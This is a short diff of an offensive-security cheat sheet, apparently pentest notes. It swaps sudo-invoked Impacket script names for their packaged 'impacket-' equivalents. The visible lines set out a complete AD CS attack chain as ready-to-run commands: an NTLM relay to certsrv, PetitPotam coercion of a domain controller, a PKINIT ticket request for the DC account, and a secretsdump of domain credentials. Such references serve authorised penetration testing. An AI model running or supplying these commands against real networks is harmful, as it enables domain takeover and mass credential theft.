@@ -2857,17 +2857,17 @@ certipy relay -ca '<CA>' -template <TEMPLATE>
 python3 PetitPotam.py <RHOST> <DOMAIN>
 certipy auth -pfx dc.pfx -dc-ip <RHOST>
 export KRB5CCNAME=dc.ccache
-sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
 ```
 
 ###### Coercing
 
 ```c
-sudo ntlmrelayx.py -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
+impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
 python3 PetitPotam.py <RHOST> <DOMAIN>
 python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
 export KRB5CCNAME=dc.ccache
-sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
+impacket-secretsdump -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
 ```
 
 ##### ESC9: No Security Extensions
